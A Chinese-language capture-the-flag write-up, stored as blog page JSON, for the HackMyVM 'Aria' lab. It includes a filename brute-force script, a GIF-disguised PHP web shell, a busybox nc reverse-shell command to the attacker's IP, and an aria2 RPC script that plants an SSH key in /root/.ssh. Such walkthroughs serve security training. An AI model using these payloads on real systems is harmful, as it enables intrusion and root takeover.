{"pageProps":{"postData":{"id":"HackMyVMAria","contentHtml":"<h1>Aria.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Aria\">https://hackmyvm.eu/machines/machine.php?vm=Aria</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMAria/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>端口扫描</h3>\n<pre><code class=\"hljs language-bash\">➜  Aria nmap -sT -min-rate 10000 -p- 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:23 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.214\nHost is up (0.00037s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1337/tcp open  waste\nMAC Address: 08:00:27:9A:02:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 17.23 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Aria nmap -sT -A -p 22,80,1337 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:25 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.214\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey:\n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Ultra-Secure Naming Service\n|_http-server-header: Apache/2.4.62 (Debian)\n1337/tcp open  waste?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck:\n|     --- Aria Debug Shell ---\n|     Type <span class=\"hljs-string\">'exit'</span> to quit ---\n|   GenericLines:\n</code></pre>\n<h3>80 端口</h3>\n<p>给出了一点信息</p>\n<ul>\n<li>通过 <code>md5(time()·rand(1,1000))</code> ****生成不可预测的文件名</li>\n<li>并且文件内容不可包含 <code>&#x3C;?php</code></li>\n<li>以及文件名仅仅可以是 gif / jpg / png</li>\n</ul>\n<p><img src=\"/post-images/HackMyVMAria/image1.png\" alt=\"image.png\"></p>\n<p><code>&#x3C;?php</code> 可以通过 <code>&#x3C;?=</code> 来绕过，文件名可以通过 <code>GIF89a</code> ，但是不可预测文件名需要想办法</p>\n<h3>1337 端口</h3>\n<p>扫描出来很奇怪，<code>nc</code> 一下</p>\n<pre><code class=\"hljs language-sql\">➜Aria nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.214</span> <span class=\"hljs-number\">1337</span>\n<span class=\"hljs-comment\">--- Aria Debug Shell ---</span>\n<span class=\"hljs-comment\">--- Type 'exit' to quit ---</span>\n\n$ help\nThis shell aids admins <span class=\"hljs-keyword\">in</span> debugging Aria services.\nUse <span class=\"hljs-keyword\">specific</span> commands <span class=\"hljs-keyword\">to</span> <span class=\"hljs-keyword\">view</span> logs <span class=\"hljs-keyword\">or</span> hidden path.\nNote: Web interface also provides foothold access.\n</code></pre>\n<blockquote>\n<p>此 Shell 可帮助管理员调试 Aria 服务。\n使用特定命令查看日志或隐藏路径。\n注意：Web 界面也提供立足点访问权限。</p>\n</blockquote>\n<p>大概是可以通过特定命令来查看日志或隐藏路径</p>\n<pre><code class=\"hljs language-bash\">$ path\nYou<span class=\"hljs-string\">'re close! Try a command related to revealing paths.\n$ path ls\nYou'</span>re close! Try a <span class=\"hljs-built_in\">command</span> related to revealing paths.\n$ path <span class=\"hljs-built_in\">dir</span>\nYou<span class=\"hljs-string\">'re close! Try a command related to revealing paths.\n$ path upload\nYou'</span>re close! Try a <span class=\"hljs-built_in\">command</span> related to revealing paths.\n$ path <span class=\"hljs-built_in\">ls</span> -al\nYou<span class=\"hljs-string\">'re close! Try a command related to revealing paths.\n$ path ls path\nYou'</span>re close! Try a <span class=\"hljs-built_in\">command</span> related to revealing paths.\n$ path ll\nYou<span class=\"hljs-string\">'re close! Try a command related to revealing paths.\n</span></code></pre>\n<p>想不到，再看看 <code>web</code> 端</p>\n<p><img src=\"/post-images/HackMyVMAria/image2.png\" alt=\"image.png\"></p>\n<h3>爆破</h3>\n<p>受不了，直接跟它爆了</p>\n<p><img src=\"/post-images/HackMyVMAria/BOOM-4x_(2).gif\" alt=\"BOOM-4x (2).gif\"></p>\n<pre><code class=\"hljs language-bash\">import <span class=\"hljs-keyword\">time</span>\nimport hashlib\nimport requests\nfrom datetime import datetime\n\n<span class=\"hljs-comment\"># --- 配置区 ---</span>\nTARGET_IP = <span class=\"hljs-string\">'192.168.56.214'</span>\nTARGET_PATH = <span class=\"hljs-string\">'/uploads/'</span>\nFILE_EXTENSION = <span class=\"hljs-string\">'.gif'</span>\nBASE_URL = f<span class=\"hljs-string\">\"http://{TARGET_IP}{TARGET_PATH}\"</span>\n\n<span class=\"hljs-comment\"># 时间范围（秒）。例如 10 表示从当前时间的前10秒到后10秒</span>\nTIME_WINDOW_SECONDS = 10\n<span class=\"hljs-comment\"># 随机数范围</span>\nRAND_MIN = 1\nRAND_MAX = 1000\n\n<span class=\"hljs-comment\"># --- 脚本核心逻辑 ---</span>\n\ndef main():\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"主执行函数\"</span><span class=\"hljs-string\">\"\"</span>\n    <span class=\"hljs-comment\"># 计算起始和结束时间戳</span>\n    current_time = int(time.time())\n    start_time = current_time - TIME_WINDOW_SECONDS\n    end_time = current_time + TIME_WINDOW_SECONDS\n\n    <span class=\"hljs-comment\"># 打印任务信息</span>\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"=\"</span> * 52)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"开始爆破...\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"目标主机: {BASE_URL}\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"成功条件: 响应状态码不为 404\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"时间范围: {datetime.fromtimestamp(start_time)} -> {datetime.fromtimestamp(end_time)}\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"随机数范围: {RAND_MIN} - {RAND_MAX}\"</span>)\n    total_attempts = (end_time - start_time + 1) * RAND_MAX\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"预计总尝试次数: {total_attempts:,}\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"=\"</span> * 52)\n\n    <span class=\"hljs-comment\"># 使用 requests.Session() 可以复用TCP连接，提高效率</span>\n    session = requests.Session()\n    session.headers.update({\n        <span class=\"hljs-string\">'User-Agent'</span>: <span class=\"hljs-string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'</span>\n    }) <span class=\"hljs-comment\"># 添加一个常见的User-Agent，避免被一些简单的WAF拦截</span>\n    \n    found = False\n    counter = 0\n\n    try:\n        <span class=\"hljs-comment\"># 外层循环遍历时间戳</span>\n        <span class=\"hljs-keyword\">for</span> t <span class=\"hljs-keyword\">in</span> range(start_time, end_time + 1):\n            <span class=\"hljs-comment\"># 内层循环遍历随机数</span>\n            <span class=\"hljs-keyword\">for</span> r <span class=\"hljs-keyword\">in</span> range(RAND_MIN, RAND_MAX + 1):\n                <span class=\"hljs-comment\"># 1. 生成原始字符串</span>\n                original_string = f<span class=\"hljs-string\">\"{t}{r}\"</span>\n                \n                <span class=\"hljs-comment\"># 2. 计算 MD5 哈希</span>\n                md5_hash = hashlib.md5(original_string.encode(<span class=\"hljs-string\">'utf-8'</span>)).hexdigest()\n                \n                <span class=\"hljs-comment\"># 3. 构造完整的 URL</span>\n                url = f<span class=\"hljs-string\">\"{BASE_URL}{md5_hash}{FILE_EXTENSION}\"</span>\n                \n                <span class=\"hljs-comment\"># 实时显示进度</span>\n                counter += 1\n                <span class=\"hljs-keyword\">if</span> counter % 500 == 0:\n                    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"已尝试 {counter:,} 次, 当前时间戳: {t}    \"</span>, end=<span class=\"hljs-string\">'\\r'</span>)\n\n                try:\n                    <span class=\"hljs-comment\"># 4. 发送 HEAD 请求检查</span>\n                    response = session.head(url, <span class=\"hljs-built_in\">timeout</span>=2, allow_redirects=True) <span class=\"hljs-comment\"># allow_redirects=True 可以跟随重定向</span>\n                    \n                    <span class=\"hljs-comment\"># 5. 判断状态码 - 如果响应不是 404 Not Found，就认为是成功</span>\n                    <span class=\"hljs-keyword\">if</span> response.status_code != 404:\n                        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n\\n[+] 成功！发现一个非 404 响应！\"</span>)\n                        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[+] 状态码: {response.status_code}\"</span>) <span class=\"hljs-comment\"># 打印实际的状态码</span>\n                        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[+] URL: {url}\"</span>)\n                        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[+] 生成源: 时间戳={t}, 随机数={r}\"</span>)\n                        found = True\n                        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-comment\"># 找到后直接退出函数</span>\n                        \n                except requests.exceptions.RequestException:\n                    <span class=\"hljs-built_in\">continue</span>\n\n    except KeyboardInterrupt:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n\\n[!] 用户手动中断了脚本。\"</span>)\n    finally:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n\"</span> + <span class=\"hljs-string\">\"=\"</span> * 52)\n        <span class=\"hljs-keyword\">if</span> not found:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"爆破完成，未找到有效文件。\"</span>)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"脚本执行结束。\"</span>)\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"=\"</span> * 52)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    main()\n\n</code></pre>\n<p>测试一下</p>\n<pre><code class=\"hljs language-bash\">------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"file\"</span>; filename=<span class=\"hljs-string\">\"nneo.gif\"</span>\nContent-Type: image/gif\n\nGIF89a\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n</code></pre>\n<p><img src=\"/post-images/HackMyVMAria/image3.png\" alt=\"image.png\"></p>\n<p>写马子</p>\n<pre><code class=\"hljs language-bash\">------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"file\"</span>; filename=<span class=\"hljs-string\">\"nneo.gif\"</span>\nContent-Type: image/gif\n\nGIF89a\n&#x3C;?= phpinfo();<span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'x'</span>]); ?>\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n</code></pre>\n<p>通过马子弹个 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">?x=busybox+nc+192.168.56.5+1234+-e+%2Fbin%2Fbash\n</code></pre>\n<p><img src=\"/post-images/HackMyVMAria/image4.png\" alt=\"image.png\"></p>\n<p>可以拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> user.txt\nflag{user-d13adadc6bbc1391394a5198cba2d1d7}\n</code></pre>\n<h2>提权</h2>\n<h3>信息收集</h3>\n<p>首先拿到完整 shell （略）</p>\n<p>查看正在监听端口，发现本地开着 <code>6800</code></p>\n<pre><code class=\"hljs language-bash\">www-data@Aria:/$ ss -tulpn\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   \nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      \ntcp     LISTEN   0        5                0.0.0.0:1337          0.0.0.0:*      \ntcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*      \ntcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      \ntcp     LISTEN   0        128                    *:80                  *:*      \ntcp     LISTEN   0        128                [::1]:6800             [::]:*      \ntcp     LISTEN   0        128                 [::]:22               [::]:* \n</code></pre>\n<p>通过 socat 转发出去</p>\n<pre><code class=\"hljs language-bash\">www-data@Aria:/tmp$ ./socat TCP-LISTEN:6801,fork TCP4:127.0.0.1:6800 &#x26;\n[1] 25929\n</code></pre>\n<p>但貌似并不是 HTTP 服务，结合吧唧名称和搜索引擎，大致确定是 aria2 的 RPC 端口，应该能从上面拿到什么文件</p>\n<blockquote>\n<p>Aria2 是一款自由、跨平台命令行界面的下载管理器，该软件根据 GPLv2 许可证进行分发</p>\n</blockquote>\n<h3>Aria2 PRC - 1</h3>\n<p>找到官方文档，测试一下 PRC 接口</p>\n<blockquote>\n<p><a href=\"https://aria2.github.io/manual/en/html/aria2c.html#terminology\">https://aria2.github.io/manual/en/html/aria2c.html#terminology</a> | <a href=\"https://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket\">https://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket</a></p>\n</blockquote>\n<p>测试，确实有回显</p>\n<pre><code class=\"hljs language-bash\">➜  Aria curl 192.168.56.116:6801/jsonrpc\n{<span class=\"hljs-string\">\"id\"</span>:null,<span class=\"hljs-string\">\"jsonrpc\"</span>:<span class=\"hljs-string\">\"2.0\"</span>,<span class=\"hljs-string\">\"error\"</span>:{<span class=\"hljs-string\">\"code\"</span>:-32600,<span class=\"hljs-string\">\"message\"</span>:<span class=\"hljs-string\">\"Invalid Request.\"</span>}}# \n</code></pre>\n<p>测试一下方法，发现需要认证</p>\n<blockquote>\n<p>要使用 RPC 方法级授权，用户必须使用 <strong><code>--rpc-secret</code></strong> 选项指定 RPC 秘密授权令牌</p>\n</blockquote>\n<pre><code class=\"hljs language-bash\">➜  Aria curl <span class=\"hljs-string\">'192.168.56.116:6801/jsonrpc?method=aria2.tellStatus&#x26;id=foo'</span>                                   \n{<span class=\"hljs-string\">\"id\"</span>:<span class=\"hljs-string\">\"foo\"</span>,<span class=\"hljs-string\">\"jsonrpc\"</span>:<span class=\"hljs-string\">\"2.0\"</span>,<span class=\"hljs-string\">\"error\"</span>:{<span class=\"hljs-string\">\"code\"</span>:1,<span class=\"hljs-string\">\"message\"</span>:<span class=\"hljs-string\">\"Unauthorized\"</span>}}# \n</code></pre>\n<h3>零宽度字符</h3>\n<p>所以现在的目标是要找到 <code>Token</code></p>\n<p>最后发现 <code>user.txt</code> 不正常</p>\n<p><img src=\"/post-images/HackMyVMAria/image5.png\" alt=\"image.png\"></p>\n<ul>\n<li><strong><code>E2 80 8B</code></strong>: 这是 UTF-8 编码下的 <strong>零宽空格 (Zero-Width Space, ZWSP)</strong>。它是一个在排版中用于在不断词的地方允许换行的字符，但它本身<strong>完全不可见</strong>，也不占据任何宽度。</li>\n<li><strong><code>E2 80 8C</code></strong>: 这是 UTF-8 编码下的 <strong>零宽非连接符 (Zero-Width Non-Joiner, ZWNJ)</strong>。它也是一个<strong>完全不可见</strong>的控制字符。</li>\n</ul>\n<p>这应该是零宽度字节隐写，通过在线工具进行解密，通过搜索引擎搜索：Zero-Width Space Steganography 能找到可用的在线工具，尝试了很多个，最后这个能用</p>\n<blockquote>\n<p><a href=\"https://stegzero.com/\">https://stegzero.com/</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMAria/image6.png\" alt=\"image.png\"></p>\n<p>得到 <code>token: maze-sec</code></p>\n<h3>Aria2 PRC - 2</h3>\n<p>在文档中能看到上传的了例子，我们让 AI 进行修改一下，上传公钥文件</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python2</span>\n<span class=\"hljs-comment\"># -*- coding: utf-8 -*-</span>\n\nimport urllib2\nimport json\n\n<span class=\"hljs-comment\"># 1. Your attacker machine's IP address and web server port</span>\nattacker_ip = <span class=\"hljs-string\">\"192.168.56.5\"</span> \nattacker_port = 8080\n\n<span class=\"hljs-comment\"># 2. The URL to your malicious authorized_keys file</span>\npayload_url = <span class=\"hljs-string\">\"http://{}:{}/authorized_keys\"</span>.format(attacker_ip, attacker_port)\n\n<span class=\"hljs-comment\"># 3. The secret token for the aria2 RPC interface</span>\nrpc_token = <span class=\"hljs-string\">\"maze-sec\"</span>\n\n<span class=\"hljs-comment\"># 4. Build the aria2 JSON-RPC request</span>\njsonreq = json.dumps({\n    <span class=\"hljs-string\">'jsonrpc'</span>: <span class=\"hljs-string\">'2.0'</span>,\n    <span class=\"hljs-string\">'id'</span>: <span class=\"hljs-string\">'qwer'</span>,\n    <span class=\"hljs-string\">'method'</span>: <span class=\"hljs-string\">'aria2.addUri'</span>,\n    <span class=\"hljs-string\">'params'</span>: [\n        <span class=\"hljs-string\">\"token:{}\"</span>.format(rpc_token),  <span class=\"hljs-comment\"># &#x3C;-- THIS IS THE CRUCIAL ADDITION</span>\n        [payload_url],                 <span class=\"hljs-comment\"># The URL list is now the second parameter</span>\n        {                              <span class=\"hljs-comment\"># The options object is now the third</span>\n            <span class=\"hljs-string\">'dir'</span>: <span class=\"hljs-string\">'/root/.ssh'</span>,\n            <span class=\"hljs-string\">'out'</span>: <span class=\"hljs-string\">'authorized_keys'</span>\n        }\n    ]\n})\n\n<span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"Sending payload with token to aria2...\"</span>\n\n<span class=\"hljs-comment\"># 5. Send the request</span>\ntry:\n    c = urllib2.urlopen(<span class=\"hljs-string\">'http://192.168.56.116:6801/jsonrpc'</span>, jsonreq)\n    <span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"Payload sent successfully!\"</span>\n    <span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"Server response:\"</span>, c.read()\n    <span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"\\nCheck your web server logs to see if the file was downloaded.\"</span>\n    <span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"If successful, you should now be able to SSH as root.\"</span>\nexcept urllib2.HTTPError as e:\n    <span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"HTTP Error:\"</span>, e.code\n    <span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"Response body:\"</span>, e.read()\nexcept Exception as e:\n    <span class=\"hljs-built_in\">print</span> <span class=\"hljs-string\">\"An error occurred:\"</span>, e\n</code></pre>\n<p>修改脚本后运行脚本，上传成功</p>\n<p><img src=\"/post-images/HackMyVMAria/image7.png\" alt=\"image.png\"></p>\n<p>通过私钥进行登录，成功登录</p>\n<p><img src=\"/post-images/HackMyVMAria/image8.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@Aria:~# <span class=\"hljs-built_in\">cat</span> root.txt \nflag{root-374495cbd5d79b6e45b7778cbac070cc}\n</code></pre>\n<h2>总结</h2>\n<p>Medium ？</p>","title":"HackMyVM - Aria","date":"2025-09-23","updated":"2025-09-23","tags":["HMV","Aria2","Zero-Width","Space","Steganography","Brute"],"categories":"靶机","comments":true,"description":"Aria. https://hackmyvm.eu/machines/machine.php?vm=Aria Recon 端口扫描 80 端口 给出了一点信息 通过 md5(time()·rand(1,1000)) 生成不可预测的文件名 并且文件内容不可包含 <?php 以及文件名仅仅可以是 gif..."},"recentPosts":[{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"}]},"__N_SSG":true}